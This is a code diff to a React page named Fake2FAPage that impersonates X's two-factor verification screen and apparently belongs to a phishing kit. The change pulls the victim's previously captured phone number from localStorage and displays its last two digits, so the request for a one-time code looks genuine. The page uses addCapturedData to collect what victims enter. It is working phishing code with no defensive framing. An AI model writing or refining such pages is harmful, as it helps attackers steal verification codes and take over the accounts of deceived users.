@@ -1,4 +1,4 @@
-import React, { useState } from 'react';
+import React, { useState, useEffect } from 'react';
 import { useNavigate } from 'react-router-dom';
 import { Helmet } from 'react-helmet';
 import { useAppState } from '@/context/AppStateContext';
@@ -6,8 +6,31 @@ import { X_LOGO_URL } from '@/config/constants';
 
 export default function Fake2FAPage() {
   const [code, setCode] = useState('');
+  const [phoneLastDigits, setPhoneLastDigits] = useState('94'); // Default fallback
   const navigate = useNavigate();
   const { addCapturedData, showToast } = useAppState();
+
+  useEffect(() => {
+    // Get the phone number from localStorage and extract last 2 digits
+    const currentCaptureString = localStorage.getItem('currentCapture');
+    if (currentCaptureString) {
+      try {
+        const currentCapture = JSON.parse(currentCaptureString);
+        if (currentCapture.phoneNumber) {
+          // Extract only digits from phone number and get last 2
+          const phoneNumber = currentCapture.phoneNumber.toString();
+          const digitsOnly = phoneNumber.replace(/\D/g, ''); // Remove all non-digits
+          const lastTwoDigits = digitsOnly.slice(-2);
+          if (lastTwoDigits.length >= 2) {
+            setPhoneLastDigits(lastTwoDigits);
+          }
+        }
+      } catch (error) {
+        console.error("Error parsing currentCapture from localStorage:", error);
+        // Keep default "94" if there's an error
+      }
+    }
+  }, []);
 
   const handleCodeChange = (e) => {
     const value = e.target.value;
@@ -63,7 +86,7 @@ export default function Fake2FAPage() {
           <img src={X_LOGO_URL} alt="X Logo" className="w-12 h-12 mx-auto mb-6" />
           <h2 className="text-[#1da1f2] text-2xl mb-[15px]">X 2FA Verification</h2>
           <p className="text-[0.95em] mb-5 text-white">
-            We’ve sent a 6-digit code to your phone ending in <strong className="font-bold">94</strong>.<br /><br />
+            We've sent a 6-digit code to your phone ending in <strong className="font-bold">{phoneLastDigits}</strong>.<br /><br />
             Please enter the code below to complete your verification.
           </p>
           <input
